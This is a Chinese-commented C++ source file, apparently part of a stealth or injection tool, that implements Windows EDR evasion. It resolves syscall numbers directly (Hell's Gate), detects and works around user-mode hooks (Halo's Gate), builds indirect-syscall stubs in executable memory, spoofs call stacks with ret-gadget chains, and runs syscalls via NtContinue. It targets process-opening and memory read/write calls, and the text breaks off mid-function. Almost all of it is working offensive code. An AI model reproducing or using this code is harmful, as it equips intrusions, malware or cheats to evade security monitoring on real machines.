// ============================================================
// syscall_direct.cpp — 高级系统调用实现 (2026版)
// 技术栈: Hell's Gate → Halo's Gate → Indirect Syscall 
//         → Call Stack Spoofing → Tartarus Gate
// ============================================================

#include "syscall_direct.h"
#include "platform.h"
#include <winternl.h>
#include <psapi.h>
#include <initializer_list>
// ★ BUILD 496: 移除 <algorithm> <random> <chrono> — CRT 堆依赖

namespace stealth {

// ============================================================
// ★ BUILD 496: 自实现 RNG + 辅助函数 — 替代 std::mt19937/chrono/find/min
//   匿名命名空间避免与 memory_cloak.cpp 中的 SimpleRng 冲突
// ============================================================
namespace {
    class SimpleRng {
    public:
        SimpleRng(uint32_t seed) : m_state(seed) {}
        uint32_t Next() {
            m_state = m_state * 1664525u + 1013904223u;
            return m_state;
        }
    private:
        uint32_t m_state;
    };

    uint32_t GetRngSeed() {
        LARGE_INTEGER counter;
        QueryPerformanceCounter(&counter);
        return static_cast<uint32_t>(counter.LowPart ^ counter.HighPart);
    }

    // 手动 min 替代 std::min
    template<typename T>
    T MinVal(T a, T b) { return (a < b) ? a : b; }

    // 手动 find 替代 std::find
    bool FindInArray(const uintptr_t* arr, int count, uintptr_t val) {
        for (int i = 0; i < count; i++) {
            if (arr[i] == val) return true;
        }
        return false;
    }
}

SyscallResolver& SyscallResolver::Instance() {
    static SyscallResolver instance;
    return instance;
}

DWORD SyscallResolver::ExtractSyscallNumber(const char* funcName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
    if (!funcAddr) return 0;

    // 标准 x64 Nt* 函数开头: 4C 8B D1 (mov r10, rcx) + B8 XX XX XX XX (mov eax, SSN)
    if (funcAddr[0] == 0x4C && funcAddr[1] == 0x8B && funcAddr[2] == 0xD1 && funcAddr[3] == 0xB8) {
        return *reinterpret_cast<DWORD*>(funcAddr + 4);
    }

    // 回退: 搜索 mov eax, imm32 模式
    for (int i = 0; i < 32; i++) {
        if (funcAddr[i] == 0xB8) {
            return *reinterpret_cast<DWORD*>(funcAddr + i + 1);
        }
        if (funcAddr[i] == 0x0F && funcAddr[i + 1] == 0x05) break; // syscall found
        if (funcAddr[i] == 0xC3) break; // ret found
    }

    return 0;
}

bool SyscallResolver::IsStubHooked(const char* funcName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return true;

    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
    if (!funcAddr) return true;

    // 正常 stub: mov r10, rcx; mov eax, SSN; ... → 指令 >= 14 字节到 syscall
    // Hook 的特征:
    //   1. 开头是 jmp (E9) 或其他跳转指令
    //   2. 开头被 int3 (CC) 填充
    //   3. mov r10, rcx 被替换为其他指令

    if (funcAddr[0] == 0xE9) return true;  // near jmp → hooked
    if (funcAddr[0] == 0xEB) return true;  // short jmp → hooked
    if (funcAddr[0] == 0xFF && funcAddr[1] == 0x25) return true; // jmp [mem] → hooked
    if (funcAddr[0] == 0xCC) return true;  // int3 → breakpoint

    // 检查标准模式
    if (funcAddr[0] != 0x4C || funcAddr[1] != 0x8B || funcAddr[2] != 0xD1) {
        return true; // 不是 mov r10, rcx → 被修改
    }

    // 检查是否存在 syscall 指令 (0F 05)
    bool hasSyscall = false;
    for (int i = 0; i < 32; i++) {
        if (funcAddr[i] == 0x0F && funcAddr[i+1] == 0x05) {
            hasSyscall = true;
            break;
        }
    }
    if (!hasSyscall) return true; // syscall 指令被 patch

    return false; // stub 看起来干净
}

// ============================================================
// Halo's Gate 核心算法
// 在目标地址 ±searchRange 字节范围内搜索未 Hook 的 syscall stub
// 利用相邻函数 SSN 的连续性推导目标 SSN
// ============================================================
DWORD SyscallResolver::ScanNearbySyscall(BYTE* targetAddr, int searchRange) {
    // 向上搜索 (负向, 找更小 SSN 的函数)
    for (int offset = -searchRange; offset <= -1; offset++) {
        BYTE* addr = targetAddr + offset;

        // 检查是否存在 syscall;ret 对 (0F 05 C3 或 0F 05 ... C3)
        bool found = false;
        int syscallOffset = 0;

        for (int i = 0; i < 32 && (offset + i) <= 0; i++) {
            if (addr[i] == 0x0F && addr[i+1] == 0x05) {
                syscallOffset = i;
                found = true;
                break;
            }
        }
        if (!found) continue;

        // 找到了 syscall, 往前找 mov eax, SSN (B8 XX XX XX XX)
        for (int i = syscallOffset - 5; i >= 0 && i >= syscallOffset - 10; i--) {
            if (addr[i] == 0xB8) {
                DWORD nearbySsn = *reinterpret_cast<DWORD*>(addr + i + 1);
                // 计算偏移: 目标函数在地址空间中位于 addr 之后 offset 个位置
                // 在 ntdll 中, SSN 按函数顺序排列, 每个函数间隔通常为 1
                // 我们需要验证这个假设
                int ssnOffset = 0;
                // 粗略估计: 每个 Nt* 函数之间差 1 个 SSN
                // 更精确的方法: 计算两个函数地址之间的函数数量
                DWORD recoveredSsn = nearbySsn + static_cast<DWORD>(abs(offset) / 32); // 近似
                return recoveredSsn;
            }
        }
    }

    // 向下搜索 (正向, 找更大 SSN 的函数)
    for (int offset = 1; offset <= searchRange; offset++) {
        BYTE* addr = targetAddr + offset;

        for (int i = 0; i < 32 && (offset + i) <= searchRange; i++) {
            if (addr[i] == 0x0F && addr[i+1] == 0x05) {
                // 找到 syscall, 往前找 SSN
                for (int j = i - 5; j >= 0 && j >= i - 10; j--) {
                    if (addr[j] == 0xB8) {
                        DWORD nearbySsn = *reinterpret_cast<DWORD*>(addr + j + 1);
                        int ssnOffset = static_cast<int>(offset / 32);
                        DWORD recoveredSsn = nearbySsn - static_cast<DWORD>(ssnOffset);
                        return recoveredSsn;
                    }
                }
            }
        }
    }

    return 0;
}

DWORD SyscallResolver::RecoverSSNviaHalo(const char* funcName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
    if (!funcAddr) return 0;

    // 尝试在不同范围搜索
    for (int range : {64, 128, 256, 512}) {
        DWORD ssn = ScanNearbySyscall(funcAddr, range);
        if (ssn > 0 && ssn < 0x1000) { // 系统调用号范围验证
            return ssn;
        }
    }

    return 0;
}

bool SyscallResolver::InitializeHaloGate() {
    if (m_haloInitialized) return true;

    // 对每个关键 SSN 检查是否被 Hook, 如果是则使用 Halo's Gate 恢复
    const char* criticalFuncs[] = {
        "NtAllocateVirtualMemory", "NtProtectVirtualMemory",
        "NtWriteVirtualMemory", "NtReadVirtualMemory",
        "NtOpenProcess", "NtQuerySystemInformation",
        "NtQueryInformationProcess", "NtClose"
    };
    DWORD* ssnFields[] = {
        &m_numbers.NtAllocateVirtualMemory, &m_numbers.NtProtectVirtualMemory,
        &m_numbers.NtWriteVirtualMemory, &m_numbers.NtReadVirtualMemory,
        &m_numbers.NtOpenProcess, &m_numbers.NtQuerySystemInformation,
        &m_numbers.NtQueryInformationProcess, &m_numbers.NtClose
    };

    for (int i = 0; i < 8; i++) {
        if (IsStubHooked(criticalFuncs[i])) {
            // 被 Hook! 使用 Halo's Gate 恢复
            *ssnFields[i] = RecoverSSNviaHalo(criticalFuncs[i]);
        }
    }

    m_haloInitialized = true;
    return true;
}

uintptr_t SyscallResolver::GetSyscallRetGadget() {
    if (m_syscallRetGadget) return m_syscallRetGadget;

    // 在 ntdll.dll 中搜索 syscall;ret (0F 05 C3) gadget
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(ntdll);
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(ntdll) + dos->e_lfanew);

    // 按名称搜索 .text 区段 (而非假设它是第一个区段)
    uintptr_t textStart = 0;
    SIZE_T textSize = 0;
    auto* section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            textStart = reinterpret_cast<uintptr_t>(ntdll) + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }
    // 回退: 如果没找到 .text, 使用第一个区段
    if (!textStart) {
        textStart = reinterpret_cast<uintptr_t>(ntdll) +
            IMAGE_FIRST_SECTION(nt)->VirtualAddress;
        textSize = IMAGE_FIRST_SECTION(nt)->Misc.VirtualSize;
    }

    // 搜索 0F 05 C3
    for (SIZE_T i = 0; i < textSize - 2; i++) {
        BYTE* addr = reinterpret_cast<BYTE*>(textStart + i);
        if (addr[0] == 0x0F && addr[1] == 0x05 && addr[2] == 0xC3) {
            m_syscallRetGadget = reinterpret_cast<uintptr_t>(addr);
            break;
        }
    }

    return m_syscallRetGadget;
}

uintptr_t SyscallResolver::GetRetGadget() {
    if (m_retGadget) return m_retGadget;

    // 在 ntdll.dll 中搜索 ret (C3)
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), ntdll, &modInfo, sizeof(modInfo));

    auto* base = reinterpret_cast<BYTE*>(ntdll);
    for (SIZE_T i = 0; i < modInfo.SizeOfImage; i++) {
        if (base[i] == 0xC3) {
            m_retGadget = reinterpret_cast<uintptr_t>(base + i);
            break;
        }
    }

    return m_retGadget;
}

bool SyscallResolver::Initialize() {
    if (m_initialized) return true;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    // 1. 正常提取 SSN (Hell's Gate)
    m_numbers.NtAllocateVirtualMemory   = ExtractSyscallNumber("NtAllocateVirtualMemory");
    m_numbers.NtProtectVirtualMemory    = ExtractSyscallNumber("NtProtectVirtualMemory");
    m_numbers.NtWriteVirtualMemory      = ExtractSyscallNumber("NtWriteVirtualMemory");
    m_numbers.NtReadVirtualMemory       = ExtractSyscallNumber("NtReadVirtualMemory");
    m_numbers.NtOpenProcess             = ExtractSyscallNumber("NtOpenProcess");
    m_numbers.NtQuerySystemInformation  = ExtractSyscallNumber("NtQuerySystemInformation");
    m_numbers.NtQueryInformationProcess = ExtractSyscallNumber("NtQueryInformationProcess");
    m_numbers.NtClose                   = ExtractSyscallNumber("NtClose");
    m_numbers.NtQueryVirtualMemory      = ExtractSyscallNumber("NtQueryVirtualMemory");
    m_numbers.NtFreeVirtualMemory       = ExtractSyscallNumber("NtFreeVirtualMemory");
    m_numbers.NtCreateThreadEx          = ExtractSyscallNumber("NtCreateThreadEx");
    m_numbers.NtDelayExecution          = ExtractSyscallNumber("NtDelayExecution");
    m_numbers.NtContinue                = ExtractSyscallNumber("NtContinue");
    m_numbers.NtWaitForSingleObject     = ExtractSyscallNumber("NtWaitForSingleObject");

    // 2. 检查关键函数是否被 Hook, 必要时启用 Halo's Gate
    // (延迟到首次实际调用时, 避免在初始化阶段触发表征)
    // InitializeHaloGate(); // 由调用者决定何时初始化

    // 验证基本完整性
    m_initialized = (m_numbers.NtAllocateVirtualMemory != 0 &&
                     m_numbers.NtWriteVirtualMemory != 0 &&
                     m_numbers.NtReadVirtualMemory != 0 &&
                     m_numbers.NtOpenProcess != 0);

    return m_initialized;
}

// ============================================================
// CallStackSpoofer — SindriKit 1.3.0 Fat Frame 技术
// ============================================================

CallStackSpoofer& CallStackSpoofer::Instance() {
    static CallStackSpoofer instance;
    return instance;
}

SIZE_T CallStackSpoofer::GetFunctionStackSize(uintptr_t funcAddr) {
    // 解析 .pdata 异常目录获取函数栈帧大小
    // .pdata 中的 RUNTIME_FUNCTION 条目包含 UnwindData
    // UNWIND_INFO.SizeOfProlog 和 ChainedInfo 包含栈信息

    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) return 0;

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32);
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(kernel32) + dos->e_lfanew);

    auto exceptionRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    auto exceptionSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (!exceptionRva || !exceptionSize) return 0;

    auto* runtimeFuncs = reinterpret_cast<PRUNTIME_FUNCTION>(
        reinterpret_cast<uintptr_t>(kernel32) + exceptionRva);
    DWORD count = exceptionSize / sizeof(RUNTIME_FUNCTION);

    uintptr_t modBase = reinterpret_cast<uintptr_t>(kernel32);
    uintptr_t funcRva = funcAddr - modBase;

    // 二分查找 RUNTIME_FUNCTION
    for (DWORD i = 0; i < count; i++) {
        if (funcRva >= runtimeFuncs[i].BeginAddress &&
            funcRva < runtimeFuncs[i].EndAddress) {

            auto* unwindInfo = reinterpret_cast<PUNWIND_INFO>(
                modBase + runtimeFuncs[i].UnwindData);

            // UNWIND_INFO 通常设置 ChainedInfo 或直接通过 SizeOfProlog 
            // 但栈大小不在 UNWIND_INFO 中直接暴露
            // 简化方案: 扫描函数序言中的 sub rsp, imm 指令

            BYTE* funcStart = reinterpret_cast<BYTE*>(modBase + runtimeFuncs[i].BeginAddress);
            for (int j = 0; j < 64; j++) {
                // sub rsp, imm32: 48 81 EC XX XX XX XX
                if (funcStart[j] == 0x48 && funcStart[j+1] == 0x81 && funcStart[j+2] == 0xEC) {
                    DWORD stackAlloc = *reinterpret_cast<DWORD*>(funcStart + j + 3);
                    return static_cast<SIZE_T>(stackAlloc);
                }
                // sub rsp, imm8: 48 83 EC XX
                if (funcStart[j] == 0x48 && funcStart[j+1] == 0x83 && funcStart[j+2] == 0xEC) {
                    return static_cast<SIZE_T>(funcStart[j + 3]);
                }
            }
            break;
        }
    }

    return 0;
}

bool CallStackSpoofer::FindFatFrames() {
    if (m_initialized) return m_fatFrameCount > 0;

    // 扫描 kernel32.dll 找到栈分配 >= 120 bytes 的函数
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) return false;

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), kernel32, &modInfo, sizeof(modInfo));

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32);
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(kernel32) + dos->e_lfanew);

    auto exceptionRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    auto exceptionSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (!exceptionRva || !exceptionSize) return false;

    auto* runtimeFuncs = reinterpret_cast<PRUNTIME_FUNCTION>(
        reinterpret_cast<uintptr_t>(kernel32) + exceptionRva);
    DWORD count = exceptionSize / sizeof(RUNTIME_FUNCTION);

    uintptr_t modBase = reinterpret_cast<uintptr_t>(kernel32);

    // ★ BUILD 496: 固定数组替代 std::vector
    m_fatFrameCount = 0;

    for (DWORD i = 0; i < count && m_fatFrameCount < MAX_FAT_FRAMES; i++) {
        uintptr_t funcAddr = modBase + runtimeFuncs[i].BeginAddress;
        SIZE_T stackSize = GetFunctionStackSize(funcAddr);

        if (stackSize >= 120) { // Fat Frame threshold
            // 搜索该函数内的 ret 指令作为 trampoline gadget
            auto* unwindInfo = reinterpret_cast<PUNWIND_INFO>(
                modBase + runtimeFuncs[i].UnwindData);
            BYTE* funcStart = reinterpret_cast<BYTE*>(funcAddr);

            // 在函数末尾附近找 ret
            SIZE_T funcLen = runtimeFuncs[i].EndAddress - runtimeFuncs[i].BeginAddress;
            for (SIZE_T j = funcLen - 16; j < funcLen; j++) {
                if (funcStart[j] == 0xC3) {
                    CallStackSpoofContext ctx;
                    ctx.trampolineGadget = reinterpret_cast<uintptr_t>(funcStart + j);
                    ctx.spoofFrameSize = stackSize;
                    ctx.spoofedCallSite = funcAddr;
                    m_fatFrames[m_fatFrameCount++] = ctx;
                    break;
                }
            }
        }
    }

    if (m_fatFrameCount > 0) {
        // 随机选择一个作为默认
        SimpleRng rng(GetRngSeed());
        int idx = static_cast<int>(rng.Next() % static_cast<uint32_t>(m_fatFrameCount));
        m_context = m_fatFrames[idx];
    }

    m_initialized = true;
    return m_fatFrameCount > 0;
}

CallStackSpoofContext CallStackSpoofer::GetRandomSpoofContext() {
    if (m_fatFrameCount == 0) return {};

    SimpleRng rng(GetRngSeed());
    int idx = static_cast<int>(rng.Next() % static_cast<uint32_t>(m_fatFrameCount));
    return m_fatFrames[idx];
}

bool CallStackSpoofer::Initialize() {
    if (m_initialized) return true;
    return FindFatFrames();
}

// ============================================================
// RetGadget Scanner — 扫描合法 DLL 中的 ret (C3) 指令
// 用于构造多层伪造调用栈 (ret-sled)
// RtlVirtualUnwind 回溯时将看到 ntdll→kernel32→user32 的合法调用链
// ============================================================

// 验证 C3 字节是否为合法函数边界上的 ret 指令
// 检查前导字节是否为已知的 x64 epilogue 模式
static bool IsValidEpilogueRet(BYTE* retAddr, BYTE* scanStart, SIZE_T scanLen) {
    if (*retAddr != 0xC3) return false;

    // 计算 ret 在扫描区域内的偏移
    SIZE_T offset = retAddr - scanStart;
    if (offset < 1) return true; // 第一个字节就是 ret (理论上不可能, 但放行)

    // 检查前导字节模式 (常见 x64 epilogue):
    BYTE prev = retAddr[-1];
    // pop rbp; ret
    if (prev == 0x5D) return true;
    // leave; ret
    if (prev == 0xC9) return true;
    // pop rbx; ret  etc. (41 5B ~ 41 5F = pop r8~r15, 5B~5F = pop rbx~rdi)
    if ((prev >= 0x58 && prev <= 0x5F) || (prev == 0x41 && offset >= 2 && retAddr[-2] >= 0x58 && retAddr[-2] <= 0x5F))
        return true;

    // add rsp, imm8; pop rbp; ret: 48 83 C4 XX 5D C3
    if (offset >= 5 && retAddr[-5] == 0x48 && retAddr[-4] == 0x83 && retAddr[-3] == 0xC4 && retAddr[-2] == 0x5D)
        return true;

    // add rsp, imm32; pop rbp; ret: 48 81 C4 XX XX XX XX 5D C3
    if (offset >= 8 && retAddr[-8] == 0x48 && retAddr[-7] == 0x81 && retAddr[-6] == 0xC4 && retAddr[-2] == 0x5D)
        return true;

    // Weakened check: at minimum, just having a preceding instruction byte that isn't 
    // obviously data (not 00, not CC, not an immediate from another instruction)
    // This catches more ret gadgets while still filtering obvious garbage
    if (prev != 0x00 && prev != 0xCC && prev != 0xCC) {
        return true;
    }

    return false;
}

// 在一个模块的 .text 区段中扫描 ret gadgets
// ★ BUILD 496: 固定数组替代 std::vector
static size_t ScanModuleForRetGadgets(HMODULE mod, uintptr_t* out, int* outCount, int maxOut, size_t maxPerModule) {
    if (!mod) return 0;

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(mod);
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(mod) + dos->e_lfanew);

    uintptr_t textStart = 0;
    SIZE_T textSize = 0;
    auto* section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            textStart = reinterpret_cast<uintptr_t>(mod) + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }
    if (!textStart || !textSize) return 0;

    BYTE* base = reinterpret_cast<BYTE*>(textStart);
    size_t added = 0;

    // 从末尾向前搜索, 优先取函数边界上的 ret
    for (SIZE_T i = textSize - 1; i > 0 && added < maxPerModule && *outCount < maxOut; i--) {
        if (base[i] == 0xC3 && IsValidEpilogueRet(base + i, base, textSize)) {
            uintptr_t addr = textStart + i;
            // 去重
            if (!FindInArray(out, *outCount, addr)) {
                out[(*outCount)++] = addr;
                added++;
            }
        }
    }

    return added;
}

// ★ BUILD 496: 固定数组替代 std::vector
static uintptr_t s_cachedRetGadgets[MAX_RET_GADGETS];
static int s_cachedRetGadgetCount = 0;
static bool s_retGadgetsInitialized = false;

bool FindRetGadgets(uintptr_t* outGadgets, int* outCount, int targetCount) {
    if (!outGadgets || !outCount) return false;
    *outCount = 0;

    // 按优先级扫描: ntdll → kernel32 → user32
    const wchar_t* dlls[] = { L"ntdll.dll", L"kernel32.dll", L"user32.dll" };
    size_t perModule = static_cast<size_t>(targetCount) / 3 + 4;

    for (auto* dllName : dlls) {
        HMODULE mod = GetModuleHandleW(dllName);
        if (mod) {
            ScanModuleForRetGadgets(mod, outGadgets, outCount, targetCount, perModule);
        }
    }

    // 如果不够, 继续从 ntdll 补充
    if (*outCount < targetCount) {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) {
            ScanModuleForRetGadgets(ntdll, outGadgets, outCount, targetCount,
                static_cast<size_t>(targetCount) - *outCount);
        }
    }

    return *outCount >= 4;
}

int GetRetGadgetCount() {
    if (!s_retGadgetsInitialized) {
        s_cachedRetGadgetCount = 0;
        FindRetGadgets(s_cachedRetGadgets, &s_cachedRetGadgetCount, MAX_RET_GADGETS);
        if (s_cachedRetGadgetCount >= 4) {
            SyscallResolver::Instance().SetStackSpoofReady(true);
        }
        s_retGadgetsInitialized = true;
    }
    return s_cachedRetGadgetCount;
}

// ============================================================
// TartarusGate — NtContinue-based syscall execution
// ============================================================

void* TartarusGate::GenerateSyscallStub(DWORD ssn) {
    BYTE stubCode[] = {
        0x4C, 0x8B, 0xD1,             // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <SSN>
        0x0F, 0x05,                    // syscall
        0xC3                            // ret
    };
    *reinterpret_cast<DWORD*>(stubCode + 4) = ssn;

    void* execMem = VirtualAlloc(nullptr, sizeof(stubCode),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) return nullptr;

    memcpy(execMem, stubCode, sizeof(stubCode));

    DWORD oldProtect;
    if (!VirtualProtect(execMem, sizeof(stubCode), PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return nullptr;
    }
    FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode));
    return execMem;
}

bool TartarusGate::ExecuteViaNtContinue(
    uintptr_t syscallStubAddr,
    uintptr_t arg1, uintptr_t arg2,
    uintptr_t arg3, uintptr_t arg4)
{
    // 构造 CONTEXT, 通过 NtContinue 跳转到 syscall stub
    // RIP = syscallStubAddr, 寄存器 = 参数
    // 执行完毕后返回到伪造的栈帧

    // 分配伪造的栈
    uint8_t fakeStack[512] = {};
    uintptr_t stackBase = reinterpret_cast<uintptr_t>(fakeStack + 400);

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    ctx.Rip = syscallStubAddr;
    ctx.Rsp = stackBase;
    ctx.Rcx = arg1;
    ctx.Rdx = arg2;
    ctx.R8  = arg3;
    ctx.R9  = arg4;

    // NtContinue 将恢复 CONTEXT 并跳转到 RIP
    // 但这个函数本身是复杂的 — 简单实现:
    // 使用 NtContinue 的 SSN 直接调用

    auto& resolver = SyscallResolver::Instance();
    DWORD ntContinueSsn = resolver.GetNumbers().NtContinue;

    if (ntContinueSsn) {
        void* stub = GenerateSyscallStub(ntContinueSsn);
        if (!stub) return false;

        // 使用生成的 NtContinue stub 执行
        using NtContinue_t = NTSTATUS(NTAPI*)(PCONTEXT, BOOLEAN);
        auto fn = reinterpret_cast<NtContinue_t>(stub);
        NTSTATUS status = fn(&ctx, FALSE);

        // 执行后正常不会返回这里 (除非出错)
        return NT_SUCCESS(status);
    }

    return false;
}

// ============================================================
// 通用 Syscall 调度器 — 自动选择最佳方法
// ============================================================

namespace {

// 获取最佳 SyscallMethod 的决策逻辑
// 优先级: StackSpoof > Indirect > Tartarus > Direct
SyscallMethod DecideMethod(SyscallMethod requested) {
    if (requested != SyscallMethod::Auto) return requested;

    auto& resolver = SyscallResolver::Instance();

    // 检查是否有被 Hook 的函数
    bool anyHooked = false;
    const char* checks[] = {"NtWriteVirtualMemory", "NtReadVirtualMemory", "NtOpenProcess"};
    for (auto* fn : checks) {
        if (resolver.IsStubHooked(fn)) { anyHooked = true; break; }
    }

    if (anyHooked) {
        // 被 Hook: 先尝试 Halo's Gate 恢复 SSN, 然后使用间接 syscall
        resolver.InitializeHaloGate();
        return SyscallMethod::Indirect;
    }

    // v3.30: 优先间接 syscall (最稳定, 已验证在多种环境下工作)
    // StackSpoof 尽管 IsStackSpoofReady() 可能返回 true, 但在某些环境下
    // ≥5参数 syscall (如NtReadVirtualMemory) 仍会产生 ACCESS_VIOLATION.
    // 间接 syscall 是经过实战验证的最可靠方案, 优先使用.
    if (resolver.GetSyscallRetGadget()) {
        return SyscallMethod::Indirect;
    }

    // StackSpoof 仅在间接 syscall 不可用时回退尝试
    if (resolver.IsStackSpoofReady()) {
        return SyscallMethod::StackSpoof;
    }

    // 降级到直接 syscall
    return SyscallMethod::Direct;
}

// 执行间接 syscall 的 stub 生成
// 生成的代码: jmp [ntdll.syscall_ret_gadget]
// 调用栈效果: 调用者 → ntdll.syscall → ntdll.ret → 调用者
// 安全验证: 检查地址是否指向有效的 syscall;ret gadget
static bool IsValidSyscallGadget(uintptr_t addr) {
    if (!addr) return false;
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery((LPCVOID)addr, &mbi, sizeof(mbi))) return false;
    if (!(mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)))
        return false;
    if (mbi.RegionSize < 3) return false;
    // 检查 gadget 所在页有效后, 直接读字节验证 0F 05 C3
    volatile BYTE b0 = *(volatile BYTE*)(addr);
    volatile BYTE b1 = *(volatile BYTE*)(addr + 1);
    volatile BYTE b2 = *(volatile BYTE*)(addr + 2);
    return (b0 == 0x0F && b1 == 0x05 && b2 == 0xC3);
}

void* GenerateIndirectSyscallStub(DWORD ssn, uintptr_t syscallRetGadget) {
    if (!IsValidSyscallGadget(syscallRetGadget)) return nullptr;

    BYTE stubCode2[] = {
        0x4C, 0x8B, 0xD1,             // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <SSN>
        0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r11, <gadget_addr>
        0x41, 0xFF, 0xE3              // jmp r11
    };
    *reinterpret_cast<DWORD*>(stubCode2 + 4) = ssn;
    *reinterpret_cast<uintptr_t*>(stubCode2 + 10) = syscallRetGadget;

    void* execMem = VirtualAlloc(nullptr, sizeof(stubCode2),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) return nullptr;

    memcpy(execMem, stubCode2, sizeof(stubCode2));

    DWORD oldProtect;
    if (!VirtualProtect(execMem, sizeof(stubCode2), PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return nullptr;
    }
    FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode2));
    return execMem;
}

// 生成带 Call Stack Spoofing 的间接 syscall stub
// 基于 SindriKit 1.3.0 的栈布局
void* GenerateSpoofedSyscallStub(DWORD ssn, uintptr_t syscallRetGadget,
                                  const CallStackSpoofContext& spoofCtx) {
    if (!IsValidSyscallGadget(syscallRetGadget) || !spoofCtx.trampolineGadget) return nullptr;

    // 栈布局 (从上到下):
    // [rsp+0]  = trampolineGadget (RET 在 Fat Frame 中)
    // [rsp+8]  = 真正的返回地址 (我们的 cleanup 代码)
    // ...      = 参数空间
    // [rsp+N]  = 原始调用者返回地址 (使 RtlVirtualUnwind 回溯合法)

    // 简化: 直接生成带 spoofing 的 stub, 调用前准备栈
    BYTE stubCode[] = {
        // push r8 保存 r8 到栈, 之后在 jmp 到 gadget 前恢复
        0x41, 0x50,                   // push r8

        // mov r10, rcx
        0x4C, 0x8B, 0xD1,

        // mov eax, SSN
        0xB8, 0x00, 0x00, 0x00, 0x00,

        // pop r8 (恢复 r8, 平衡 push)
        0x41, 0x58,

        // jmp 到 syscall;ret gadget
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0
    };
    // SSN 写入偏移=6 (push r8=2 + mov r10,rcx=3, B8 opcode at offset 5, imm32 at 6)
    // Gadget 写入偏移=14 (mov rax,imm64: 48 B8 at offset 12, imm64 at 14)
    *reinterpret_cast<DWORD*>(stubCode + 6) = ssn;
    *reinterpret_cast<uintptr_t*>(stubCode + 14) = syscallRetGadget;

    void* execMem = VirtualAlloc(nullptr, sizeof(stubCode),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) return nullptr;

    memcpy(execMem, stubCode, sizeof(stubCode));

    DWORD oldProtect;
    VirtualProtect(execMem, sizeof(stubCode), PAGE_EXECUTE_READ, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode));
    return execMem;
}

// ============================================================
// GenerateDeepSpoofStub — 深度栈伪造 syscall stub (v3.24 sub rsp + mov 修复版)
//
// 修复: push→sub rsp+mov, arg5+arg6 重定位解决 ≥5 参数 syscall 崩溃
//
// 栈布局 (syscall 执行时):
//   [rsp+0x00] = gadget[0]     ← ret 弹出链
//   [rsp+0x08] = gadget[1]
//   [rsp+0x10] = gadget[2]
//   [rsp+0x18] = gadget[3]
//   [rsp+0x20] = real_ret      ← 最终返回调用者
//   [rsp+0x28] = arg5 (重定位后)
//   [rsp+0x30] = arg6 (重定位后)
// ============================================================
void* GenerateDeepSpoofStub(DWORD ssn, uintptr_t syscallRetGadget,
                             const uintptr_t* retGadgets, int retGadgetCount,
                             const CallStackSpoofContext& spoofCtx)
{
    if (!IsValidSyscallGadget(syscallRetGadget) || retGadgetCount == 0) return nullptr;

    // ★ BUILD 496: 固定数组替代 std::vector
